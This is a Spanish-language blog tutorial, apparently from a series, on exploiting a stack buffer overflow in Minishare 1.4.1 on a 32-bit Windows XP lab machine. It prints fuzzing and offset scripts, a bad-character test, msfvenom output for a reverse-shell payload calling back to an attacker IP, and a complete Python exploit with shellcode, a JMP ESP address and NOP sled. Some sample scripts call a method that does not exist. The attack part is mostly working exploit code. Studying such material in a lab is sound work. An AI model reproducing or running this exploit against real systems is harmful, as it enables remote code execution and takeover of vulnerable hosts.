
El 20 de febrero de 2022 publique mi primer articulo sobre como abordar una explotación de *Buffer overflow* de manera exitosa, además de comprender los conceptos básicos para su desempeño en sistemas operativos GNU/Linux. 

Hoy traigo la parte dos de esta saga. En este articulo explicare de manera detallada la explotación de BoF en sistemas operativos Windows de 32 bits.

Llevaremos a cabo nuestras pruebas utilizando el software Minishare, concretamente la version 1.4.1.  Este programa actúa como servidor HTTP simple para intercambiar archivos de manera sencilla y eficaz entre múltiples usuarios en Red. 

Este software permite a atacantes obtener ejecución remota de comandos a través de una consulta HTTP malintencionada via GET, POST o incluso HEAD. Este problema surge debido a una verificación incorrecta del *input* del usuario.

En el laboratorio de hoy aprovecharemos esta vulnerabilidad para ganar acceso a la maquina victima a través de una petición GET preparada.

Material necesario:
- Windows XP (32 bits) [Victima]
- GNU/Linux (32/64 bits) [Atacante]
- Minishare 1.4.1 
- Immunity Debugger
	- mona.py 
- Python2 / Python3

Para esta prueba de concepto no tendremos activado ASLR (Aleatorización en las direcciones de memoria) y del mismo modo tampoco tendremos DEP (Prevención de ejecución de datos). 

Una vez con todo los requisitos preparados comenzaremos iniciando Immunity debugger y posteriormente Minishare en nuestro Windows XP, seguidamente pulsaremos CTRL + F1 para vincularnos con Minishare.

![2](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/7f0aad41-8f65-4132-9055-caf23359a755)

Este es el aspecto resultante (4 ventanas):
- Instrucciones de CPU [1 ventana]
- Registros y flags [2 ventana]
- Volcado de memoria [3 ventana]
- Pila [4 ventana]

![3](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/189a402e-d636-4c7f-bc1f-10f9259756e7)

En este punto ya podemos comenzar a trabajar. El primer paso será crear un *fuzzer* para determinar el numero de Bytes a enviar antes de que el programa corrompa.

Para ello me he creado un pequeño script en Python3:
```python3
#!/usr/bin/python3

import socket
from dataclasses import dataclass 
from sys import exit 
import signal
from pwn import *

def def_handler(sig,frame): # Función para controlar la interrupcion del script
    print("\nSaliendo...\n")
    exit(1)
signal.signal(signal.SIGINT, def_handler)

@dataclass 
class Fuzzer:
    http_method: str  
    buff: str
    http_header: str
    ip: str

    def fuzzerhttp(self):
        p1 = log.progress("Fuzzer")
        while True: # Bucle infinito para enviar mutliples bytes 
            self.buff = self.buff+"\x41"*100
            buff_final = self.http_method + self.buff + self.http_header
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creacion del socket 
                sock.connect((self.ip, 80))
                p1.status(f"Probing with {len(self.buff)} bytes")
                sock.send(buff_final.encode()) # Envio de X bytes a través del socket 
                sock.recv(1024)
                sock.close()
            except: # Exepcion para controlar el crasheo del programa 
                p1.success(f"Crashed with {len(self.buff)} bytes")
                exit()

fuzzer = Fuzzer("GET ", "", " HTTP/1.1\r\n\r\n", "192.168.1.140") # Definición de variables

def main():
    fuzzer.offset()

if __name__ == '__main__':
    main()
```

Este script enviara 100 caracteres A representados en HEX `\x41` cada x tiempo hasta dar con el numero maximo de Bytes en el que el programa corrompe.

Podemos ver mejor el funcionamiento de este script si solo enviamos 100 bytes e imprimimos el resultado.

```python3
#!/usr/bin/python3

import socket
from dataclasses import dataclass 
from sys import exit 
import signal
from pwn import *

def def_handler(sig,frame): # Función para controlar la interrupcion del script
    print("\nSaliendo...\n")
    exit(1)
signal.signal(signal.SIGINT, def_handler)

@dataclass 
class Fuzzer:
    http_method: str  
    buff: str
    http_header: str
    ip: str

    def fuzzerhttp(self):      
        self.buff = self.buff+"\x41"*100
        buff_final = self.http_method + self.buff + self.http_header
        print(buff_final)
fuzzer = Fuzzer("GET ", "", " HTTP/1.1\r\n\r\n", "192.168.1.140") # Definición de variables

def main():
    fuzzer.offset()

if __name__ == '__main__':
    main()
```
Resultado:

![4](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/938501f7-7663-49d8-8ca3-c861e1c08e0a)

Con el bucle infinito estariamos enviando 100 bytes constantemente hasta que se genere la exepcion y por consecuente que el programa corrompa.

A continuación un video de su funcionamiento:

https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/0ddf0518-21cb-4227-9294-2a6408873e5f

Segun el *fuzzer*, el programa corrompe entre 1700 y 1800 Bytes, pero esto no nos sirve, debemos conocer el numero de bytes exactos antes de sobreescribir el registro EIP. Para ello podemos generar una cadena preparada para determinar este numero. Esto lo podemos hacer con una utilidad llamada mona.py.

![image](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/89bbba8e-b093-4cfa-b08e-f6840fd6b3e1)

> **Nota:** 1800 -> N° de Bytes en que corrompe el programa

No es recomendable copiar directamente la cadena, una mejor manera de hacerlo es mediante el archivo `txt` que nos genera en `C:\Program Files\Immunity Inc\Immunity Debugger`.

![7](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/945997f0-926b-455a-b243-132f511900cc)

Lo abrimos y copiamos el ASCII.

![8](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/21e32387-8212-4c0e-85f6-fa98c241ab24)

Una vez tenemos esta cadena ya podremos calcular de manera exacta el offset. 

Con la misma base de antes he creado este script en Python3:

```python3
#!/usr/bin/python3

import socket
from dataclasses import dataclass 
from sys import exit 
import signal
from pwn import *

def def_handler(sig,frame):
    print("\nSaliendo...\n")
    exit(1)
signal.signal(signal.SIGINT, def_handler)

@dataclass 
class Offset:
    http_method: str
    buff: str
    http_header: str
    ip: str

    def offset_calc(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
        sock.connect((self.ip, 80))
        self.buff += 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9'
        buff_final = self.http_method + self.buff + self.http_header
        sock.send(buff_final.encode())
        sock.recv(1024)
        sock.close()

offset = Offset("GET ", "", " HTTP/1.1\r\n\r\n", "192.168.1.140")

def main():
    offset.offset_calc()

if __name__ == '__main__':
    main()
```

Este script simplemente se conecta al servidor y envia la cadena preparada que contiene 1800 Bytes.

Entonces como es de esperar cuando se envian 1800 Bytes el programa corrompe:

![9](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/808d44d0-727c-49a4-8911-76123f05a45f)

En este punto simplemente debemos copiar la direccion que se queda en EIP despues de que corrompa el programa.
Ahora podemos usar mona.py para calcular el numero de bytes necesarios antes de sobreescribir EIP.

![10](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/54d1039c-feee-469a-8b73-ed4681f32085)

Perfecto!, 1787 Bytes son los que hacen falta antes de sobreescribir EIP. 

En este punto es importante tener en cuenta un concepto. Hay ciertos de caracteres que son "malos" o invalidos y nos pueden ocasionar problemas a la hora de representar el `shellcode`, estos caracteres son los siguientes:

- `\x00` Byte nulo
- `\x0A` Salto de linea
- `\x0D` Retorno de carro
- `\xFF` Salto de formato

> **Nota:** Los mas comúnes suelen ser `\x00` y `\x0D`.

Podemos detectarlos utilizando una funcionalidad de mona.py para generar una cadena de todos los posibles bytes. 

![image](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/ac089a3e-c923-44dc-9947-2d0aa9e2b7f8)

De igual manera que antes podemos copiarla desde el archivo `txt` que nos genera en `C:\Program Files\Immunity Inc\Immunity Debugger`.

Entonces vamos a hacer una prueba, para lo cual he creado otro pequeño script en python3 para abordar esta situacion:

```python3
#!/usr/bin/python3

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('192.168.1.140',80))
metodo_http = "GET "
buff = "A"*1787 + "B"*4 + "C"*400
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
buff = buff+badchars
cabecera_http=" HTTP/1.1\r\n\r\n"
buff_final = metodo_http+buff+cabecera_http
sock.send(buff_final.encode())
sock.recv(1024)
sock.close()
```

Este script envía una secuencia de 1787 caracteres "A" seguido de 4 caracteres "B", 400 caracteres "C" y la cadena generada por mona.py.
Una vez ejecutado el script podemos apreciar como EIP corresponde a 4 Bytes de `\x42` , que a su vez es el caracter "B" en HEX.

![11](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/2b21eadb-7e4a-40cf-bd98-89ede9c32634)

Hasta aqui todo bien, pero si miramos el volcado del registro ESP haciendo *Follow in Dump* sobre el mismo.
![followindump](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/3c34c5e6-ec5d-4a64-9733-aceced8da33e)

> **Nota:** Nos interesa ESP porque es donde se encuentran todos los bytes generados por mona.py

![badchars](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/53598358-c26c-408b-b6b7-90fd02aaa9d4)

Como podemos apreciar No nos representa todos los bytes, esto se debe a que hay algunos que son invalidos, para solucionar esto simplemente hay que eliminar los que no consigue representar. En este caso no podemos apreciar `\x0b` por lo que debemos eliminarlo de nuestro script y volver a ejecutarlo.

![image](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/e2088276-b82f-46e1-8bd3-ab1f76fa01f5)

De la misma manera no vemos `\x0d`, por lo que debemos eliminarlo, vamos a probar ahora.

![0d](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/95fd10bb-4130-473e-8723-43fe6297f706)

Muy bien!, ahora ya nos logra representar todos los bytes sin problema, los badchars encontrados fueron eliminados.

El siguiente paso es buscar una direccion que salte a ESP, ya que ahí es donde estara ubicado nuestro `shellcode`, para ello podemos usar mona.py.

![image](https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/cb296113-9e78-4342-a6d8-3b483b8a4731)

> **Nota:** Es importante mencionar que debemos elegir una direccion de las DLL's que este en system32

Ya casi hemos acabado, ahora debemos generar un `shellcode` que nos permita ganar una shell, para ello podemos crearlo usando `msfvenom`.

```bash
-/$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.139 lport=443 -b "\x00\x0d" -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1745 bytes
buf =  b""
buf += b"\xda\xc8\xd9\x74\x24\xf4\xbd\x9d\x3a\xd4\xc4\x5f"
buf += b"\x29\xc9\xb1\x52\x31\x6f\x17\x83\xc7\x04\x03\xf2"
buf += b"\x29\x36\x31\xf0\xa6\x34\xba\x08\x37\x59\x32\xed"
buf += b"\x06\x59\x20\x66\x38\x69\x22\x2a\xb5\x02\x66\xde"
buf += b"\x4e\x66\xaf\xd1\xe7\xcd\x89\xdc\xf8\x7e\xe9\x7f"
buf += b"\x7b\x7d\x3e\x5f\x42\x4e\x33\x9e\x83\xb3\xbe\xf2"
buf += b"\x5c\xbf\x6d\xe2\xe9\xf5\xad\x89\xa2\x18\xb6\x6e"
buf += b"\x72\x1a\x97\x21\x08\x45\x37\xc0\xdd\xfd\x7e\xda"
buf += b"\x02\x3b\xc8\x51\xf0\xb7\xcb\xb3\xc8\x38\x67\xfa"
buf += b"\xe4\xca\x79\x3b\xc2\x34\x0c\x35\x30\xc8\x17\x82"
buf += b"\x4a\x16\x9d\x10\xec\xdd\x05\xfc\x0c\x31\xd3\x77"
buf += b"\x02\xfe\x97\xdf\x07\x01\x7b\x54\x33\x8a\x7a\xba"
buf += b"\xb5\xc8\x58\x1e\x9d\x8b\xc1\x07\x7b\x7d\xfd\x57"
buf += b"\x24\x22\x5b\x1c\xc9\x37\xd6\x7f\x86\xf4\xdb\x7f"
buf += b"\x56\x93\x6c\x0c\x64\x3c\xc7\x9a\xc4\xb5\xc1\x5d"
buf += b"\x2a\xec\xb6\xf1\xd5\x0f\xc7\xd8\x11\x5b\x97\x72"
buf += b"\xb3\xe4\x7c\x82\x3c\x31\xd2\xd2\x92\xea\x93\x82"
buf += b"\x52\x5b\x7c\xc8\x5c\x84\x9c\xf3\xb6\xad\x37\x0e"
buf += b"\x51\x12\x6f\x11\x2a\xfa\x72\x11\x2d\x40\xfb\xf7"
buf += b"\x47\xa6\xaa\xa0\xff\x5f\xf7\x3a\x61\x9f\x2d\x47"
buf += b"\xa1\x2b\xc2\xb8\x6c\xdc\xaf\xaa\x19\x2c\xfa\x90"
buf += b"\x8c\x33\xd0\xbc\x53\xa1\xbf\x3c\x1d\xda\x17\x6b"
buf += b"\x4a\x2c\x6e\xf9\x66\x17\xd8\x1f\x7b\xc1\x23\x9b"
buf += b"\xa0\x32\xad\x22\x24\x0e\x89\x34\xf0\x8f\x95\x60"
buf += b"\xac\xd9\x43\xde\x0a\xb0\x25\x88\xc4\x6f\xec\x5c"
buf += b"\x90\x43\x2f\x1a\x9d\x89\xd9\xc2\x2c\x64\x9c\xfd"
buf += b"\x81\xe0\x28\x86\xff\x90\xd7\x5d\x44\xa0\x9d\xff"
buf += b"\xed\x29\x78\x6a\xac\x37\x7b\x41\xf3\x41\xf8\x63"
buf += b"\x8c\xb5\xe0\x06\x89\xf2\xa6\xfb\xe3\x6b\x43\xfb"
buf += b"\x50\x8b\x46"
```
> **Nota:** Imporante incluir los *badchars* encontrados anteriormente para evitarlos en el `shellcode`

Ya tenemos el `shellcode`. Solo nos falta crear el *exploit*:

```python3
#!/usr/bin/python3

from pwn import *
from sys import exit
from dataclasses import dataclass
import socket
import signal

def def_handler(sig,frame):
    print("\nSaliendo...\n")
    exit(1)
signal.signal(signal.SIGINT, def_handler)

@dataclass
class Exploit():
    ip: str
    port: int
    http_header: str
    http_method: str
    
    def shellcode_req(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, self.port))

            buf =  b""
            buf += b"\xda\xda\xd9\x74\x24\xf4\x5b\xbf\x4d\xb9\xdc\x50"
            buf += b"\x2b\xc9\xb1\x52\x83\xeb\xfc\x31\x7b\x13\x03\x36"
            buf += b"\xaa\x3e\xa5\x34\x24\x3c\x46\xc4\xb5\x21\xce\x21"
            buf += b"\x84\x61\xb4\x22\xb7\x51\xbe\x66\x34\x19\x92\x92"
            buf += b"\xcf\x6f\x3b\x95\x78\xc5\x1d\x98\x79\x76\x5d\xbb"
            buf += b"\xf9\x85\xb2\x1b\xc3\x45\xc7\x5a\x04\xbb\x2a\x0e"
            buf += b"\xdd\xb7\x99\xbe\x6a\x8d\x21\x35\x20\x03\x22\xaa"
            buf += b"\xf1\x22\x03\x7d\x89\x7c\x83\x7c\x5e\xf5\x8a\x66"
            buf += b"\x83\x30\x44\x1d\x77\xce\x57\xf7\x49\x2f\xfb\x36"
            buf += b"\x66\xc2\x05\x7f\x41\x3d\x70\x89\xb1\xc0\x83\x4e"
            buf += b"\xcb\x1e\x01\x54\x6b\xd4\xb1\xb0\x8d\x39\x27\x33"
            buf += b"\x81\xf6\x23\x1b\x86\x09\xe7\x10\xb2\x82\x06\xf6"
            buf += b"\x32\xd0\x2c\xd2\x1f\x82\x4d\x43\xfa\x65\x71\x93"
            buf += b"\xa5\xda\xd7\xd8\x48\x0e\x6a\x83\x04\xe3\x47\x3b"
            buf += b"\xd5\x6b\xdf\x48\xe7\x34\x4b\xc6\x4b\xbc\x55\x11"
            buf += b"\xab\x97\x22\x8d\x52\x18\x53\x84\x90\x4c\x03\xbe"
            buf += b"\x31\xed\xc8\x3e\xbd\x38\x5e\x6e\x11\x93\x1f\xde"
            buf += b"\xd1\x43\xc8\x34\xde\xbc\xe8\x37\x34\xd5\x83\xc2"
            buf += b"\xdf\x1a\xfb\xcd\x94\xf3\xfe\xcd\xab\xb8\x76\x2b"
            buf += b"\xc1\xae\xde\xe4\x7e\x56\x7b\x7e\x1e\x97\x51\xfb"
            buf += b"\x20\x13\x56\xfc\xef\xd4\x13\xee\x98\x14\x6e\x4c"
            buf += b"\x0e\x2a\x44\xf8\xcc\xb9\x03\xf8\x9b\xa1\x9b\xaf"
            buf += b"\xcc\x14\xd2\x25\xe1\x0f\x4c\x5b\xf8\xd6\xb7\xdf"
            buf += b"\x27\x2b\x39\xde\xaa\x17\x1d\xf0\x72\x97\x19\xa4"
            buf += b"\x2a\xce\xf7\x12\x8d\xb8\xb9\xcc\x47\x16\x10\x98"
            buf += b"\x1e\x54\xa3\xde\x1e\xb1\x55\x3e\xae\x6c\x20\x41"
            buf += b"\x1f\xf9\xa4\x3a\x7d\x99\x4b\x91\xc5\xa9\x01\xbb"
            buf += b"\x6c\x22\xcc\x2e\x2d\x2f\xef\x85\x72\x56\x6c\x2f"
            buf += b"\x0b\xad\x6c\x5a\x0e\xe9\x2a\xb7\x62\x62\xdf\xb7"
            buf += b"\xd1\x83\xca" 
            
            buff = b"A" * 1787 + p32(0x7E6B30EB) + b"\x90" * 20 + buf

            buff_final = self.http_method.encode() + buff + self.http_header.encode()
            
            sock.send(buff_final)
            sock.recv(1024)
            sock.close()
        
        except ConnectionError:
            print("\nConnection socket failed\n")
            exit(1)

exploit = Exploit("192.168.1.140", 80, " HTTP/1.1\r\n\r\n", "GET ")

def main():
    exploit.shellcode_req()

if __name__ == "__main__":
    main()
```

Este exploit seguira el siguiente flujo.

```
AAAAAAAAAA.... → \xeb\x30\x6b\7e → \x90\x90\x90\x90... → \xda\xda\xd9\x74\x24\xf4\x5b\x...
     ↥ 			↥                 ↥                             ↥
   \x41               jmp esp            NOPS                         shellcode
```
> **Importante:** Añadir NOPS para seguir correctamente el flujo del *exploit* y poner dirección de salto a ESP en *little endian*

A continuación un video del *exploit* en ejecución:

https://github.com/WackyHacker/wackyhacker.github.io/assets/69093629/ad802ef5-06d7-49c8-a82c-f38f9558da12



